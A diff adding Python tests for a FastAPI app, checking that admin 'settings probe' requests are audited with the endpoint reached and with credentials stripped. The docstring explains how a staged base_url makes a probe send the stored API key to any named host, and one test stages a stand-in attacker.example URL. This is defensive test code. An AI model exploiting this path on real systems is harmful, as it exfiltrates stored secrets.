@@ -14,6 +14,7 @@ write never turns that 4xx into a 500.
 
 from __future__ import annotations
 
+import json
 import uuid
 from datetime import UTC, datetime
 from typing import Any
@@ -26,6 +27,7 @@ from fastapi.testclient import TestClient
 from app.api.v1 import jobs as jobs_module  # noqa: E402
 from app.api.v1 import samples as samples_module  # noqa: E402
 from app.api.v1 import sandbox_reports as reports_module  # noqa: E402
+from app.api.v1 import settings as settings_module  # noqa: E402
 from app.database import get_db  # noqa: E402
 from app.deps import get_current_user, require_active_user  # noqa: E402
 from app.services import audit as audit_module  # noqa: E402
@@ -237,3 +239,135 @@ def test_an_audit_write_that_fails_never_breaks_the_request(rows, monkeypatch):
     app.dependency_overrides[get_current_user] = lambda: user
     app.dependency_overrides[jobs_module._get_service] = lambda: svc
     assert TestClient(app).delete(f"/api/v1/jobs/{job_id}").status_code == 204
+
+
+class TestAProbeLeavesARow:
+    """A probe sends stored credentials to a staged endpoint, and said nothing.
+
+    ``run_probe`` backfills every input the caller did not stage from the
+    decrypted store, so ``POST /settings/test/llm`` with a staged
+    ``base_url`` sends the *stored* API key to whatever host the caller named
+    — a secret the settings console deliberately never shows an admin in the
+    clear. Saving that endpoint is audited and gated; pointing a probe at it
+    was neither. It is admin-only either way, so the fix is the record.
+    """
+
+    def _client(self, monkeypatch: Any, user: Any) -> TestClient:
+        from app.deps import require_admin
+
+        app = FastAPI()
+        app.include_router(settings_module.router, prefix="/api/v1")
+        app.dependency_overrides[get_db] = lambda: MagicMock()
+        app.dependency_overrides[require_admin] = lambda: user
+        monkeypatch.setattr(
+            settings_module.SettingsService, "load_overrides", AsyncMock(return_value={})
+        )
+        return TestClient(app)
+
+    def test_every_probe_is_recorded_with_the_endpoint_it_was_pointed_at(
+        self, rows: Any, monkeypatch: Any
+    ) -> None:
+        from app.services.settings_probes import ProbeResult
+
+        user = MagicMock(id=uuid.uuid4())
+        secret = "hunter2"
+        monkeypatch.setattr(
+            settings_module,
+            "run_probe",
+            AsyncMock(return_value=ProbeResult(True, 12, "ok")),
+        )
+        client = self._client(monkeypatch, user)
+
+        response = client.post(
+            "/api/v1/settings/test/llm",
+            json={"values": {"core.llm.openai.base_url": f"http://u:{secret}@attacker.example/v1"}},
+        )
+
+        assert response.status_code == 200, response.text
+        row = rows.one("settings.probe")
+        assert row.resource_type == "settings"
+        assert row.resource_id == "llm"
+        assert row.user_id == user.id
+        assert row.details["endpoints"] == ["http://attacker.example"]
+        # The staged keys are named so a reader can see the endpoint did not
+        # come from the store; their values never are.
+        assert row.details["staged"] == ["core.llm.openai.base_url"]
+        assert row.details["ok"] is True
+        assert secret not in json.dumps(row.details)
+
+    def test_the_agent_probe_records_what_it_reached(self, rows: Any, monkeypatch: Any) -> None:
+        from app.services.settings_probes import ProbeResult
+
+        user = MagicMock(id=uuid.uuid4())
+        monkeypatch.setattr(
+            settings_module,
+            "run_agent_probe",
+            AsyncMock(
+                return_value=ProbeResult(
+                    True,
+                    12,
+                    "ok",
+                    details={
+                        "completions": [
+                            {
+                                "endpoint": "http://u:pw@box:8080/v1",
+                                "model": "m",
+                                "provider": "openai",
+                                "ok": True,
+                                "detail": "d",
+                            }
+                        ]
+                    },
+                )
+            ),
+        )
+        monkeypatch.setattr(
+            settings_module, "_write_down_what_was_reached", AsyncMock(return_value=None)
+        )
+        client = self._client(monkeypatch, user)
+
+        response = client.post("/api/v1/settings/test/agent?name=static", json={"values": {}})
+
+        assert response.status_code == 200, response.text
+        row = rows.one("settings.probe")
+        assert row.resource_id == "agent"
+        assert row.details["endpoints"] == ["http://box:8080"]
+        assert "pw" not in json.dumps(row.details)
+
+    def test_the_mcp_probe_records_the_server_it_launched(
+        self, rows: Any, monkeypatch: Any
+    ) -> None:
+        from app.services.settings_probes import ProbeResult
+
+        user = MagicMock(id=uuid.uuid4())
+        monkeypatch.setattr(
+            settings_module, "run_mcp_probe", AsyncMock(return_value=ProbeResult(True, 5, "ok"))
+        )
+        client = self._client(monkeypatch, user)
+
+        response = client.post(
+            "/api/v1/settings/test/mcp?server=network",
+            json={"values": {"core.mcp.servers": {"network": {"url": "https://h/mcp"}}}},
+        )
+
+        assert response.status_code == 200, response.text
+        row = rows.one("settings.probe")
+        assert row.resource_id == "mcp"
+        assert row.details["server"] == "network"
+
+    def test_a_failed_probe_is_recorded_too(self, rows: Any, monkeypatch: Any) -> None:
+        from app.services.settings_probes import ProbeResult
+
+        user = MagicMock(id=uuid.uuid4())
+        monkeypatch.setattr(
+            settings_module,
+            "run_probe",
+            AsyncMock(return_value=ProbeResult(False, 12, "connection refused")),
+        )
+        client = self._client(monkeypatch, user)
+
+        client.post("/api/v1/settings/test/qdrant", json={"values": {}})
+
+        row = rows.one("settings.probe")
+        assert row.details["ok"] is False
+        assert row.details["staged"] == []
